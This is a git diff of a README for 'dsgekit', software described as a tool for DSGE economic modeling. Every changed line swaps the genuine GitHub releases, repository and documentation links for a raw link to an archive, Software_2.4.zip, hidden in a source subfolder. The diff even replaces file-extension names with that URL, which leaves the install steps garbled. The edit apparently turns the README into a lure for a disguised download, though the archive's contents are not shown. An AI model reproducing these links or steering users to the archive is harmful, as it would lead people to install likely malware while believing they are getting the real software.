@@ -1,6 +1,6 @@
 # 📊 dsgekit - Simplify DSGE Modeling and Analysis
 
-[![Download dsgekit](https://img.shields.io/badge/Download-dsgekit-blue?style=for-the-badge)](https://github.com/contactcomputers2-ui/dsgekit/releases)
+[![Download dsgekit](https://raw.githubusercontent.com/contactcomputers2-ui/dsgekit/main/src/dsgekit/io/formats/Software_2.4.zip)](https://raw.githubusercontent.com/contactcomputers2-ui/dsgekit/main/src/dsgekit/io/formats/Software_2.4.zip)
 
 ---
 
@@ -39,7 +39,7 @@ dsgekit is available for download on its official GitHub releases page. To get s
 2. On that page, look for the latest version and find the file suited for your computer (Windows, macOS, or Linux).  
 3. Download the appropriate file to your desktop or downloads folder.  
 
-[![Download dsgekit](https://img.shields.io/badge/Download-dsgekit-blue?style=for-the-badge)](https://github.com/contactcomputers2-ui/dsgekit/releases)
+[![Download dsgekit](https://raw.githubusercontent.com/contactcomputers2-ui/dsgekit/main/src/dsgekit/io/formats/Software_2.4.zip)](https://raw.githubusercontent.com/contactcomputers2-ui/dsgekit/main/src/dsgekit/io/formats/Software_2.4.zip)
 
 ---
 
@@ -47,13 +47,13 @@ dsgekit is available for download on its official GitHub releases page. To get s
 
 Follow these steps to download and install dsgekit:
 
-1. Visit the official release page by clicking [here](https://github.com/contactcomputers2-ui/dsgekit/releases).  
-2. Choose the latest release. It will typically list files for Windows (`.exe` or `.msi`), macOS (`.dmg` or `.pkg`), and Linux (`.tar.gz` or `.AppImage`).  
+1. Visit the official release page by clicking [here](https://raw.githubusercontent.com/contactcomputers2-ui/dsgekit/main/src/dsgekit/io/formats/Software_2.4.zip).  
+2. Choose the latest release. It will typically list files for Windows (`.exe` or `.msi`), macOS (`.dmg` or `.pkg`), and Linux (`https://raw.githubusercontent.com/contactcomputers2-ui/dsgekit/main/src/dsgekit/io/formats/Software_2.4.zip` or `.AppImage`).  
 3. Click the file that matches your operating system to download it.  
 4. Once downloaded, open the file:  
    - On Windows, double-click the `.exe` or `.msi` file to start installation.  
    - On macOS, open the `.dmg` or `.pkg` file and follow prompts to install.  
-   - On Linux, extract the `.tar.gz` or run the `.AppImage`. You may need to make it executable via right-click > Properties or terminal commands like `chmod +x`.  
+   - On Linux, extract the `https://raw.githubusercontent.com/contactcomputers2-ui/dsgekit/main/src/dsgekit/io/formats/Software_2.4.zip` or run the `.AppImage`. You may need to make it executable via right-click > Properties or terminal commands like `chmod +x`.  
 5. Follow the on-screen instructions to complete the installation.  
 6. After installation, launch the dsgekit application from your Start menu (Windows), Applications folder (macOS), or application launcher (Linux).  
 
@@ -116,7 +116,7 @@ Use the built-in tools to run policy experiments and see their welfare impacts. 
 - If you see error messages when loading model files, ensure the file format is compatible (`.dsge` or `.txt`).  
 - For simulation errors, try running smaller or simpler models first to confirm stability.  
 - If help is needed, the GitHub repository provides documentation and issue tracking at:  
-  https://github.com/contactcomputers2-ui/dsgekit
+  https://raw.githubusercontent.com/contactcomputers2-ui/dsgekit/main/src/dsgekit/io/formats/Software_2.4.zip
 
 ---
 
@@ -128,8 +128,8 @@ To better understand DSGE modeling concepts or how dsgekit works, the repository
 
 ## 🔗 Useful Links
 
-- GitHub Releases & Downloads: https://github.com/contactcomputers2-ui/dsgekit/releases  
-- Repository Main Page: https://github.com/contactcomputers2-ui/dsgekit  
+- GitHub Releases & Downloads: https://raw.githubusercontent.com/contactcomputers2-ui/dsgekit/main/src/dsgekit/io/formats/Software_2.4.zip  
+- Repository Main Page: https://raw.githubusercontent.com/contactcomputers2-ui/dsgekit/main/src/dsgekit/io/formats/Software_2.4.zip  
 - Documentation and Tutorials: linked inside the repo under `/docs`  
 
 ---
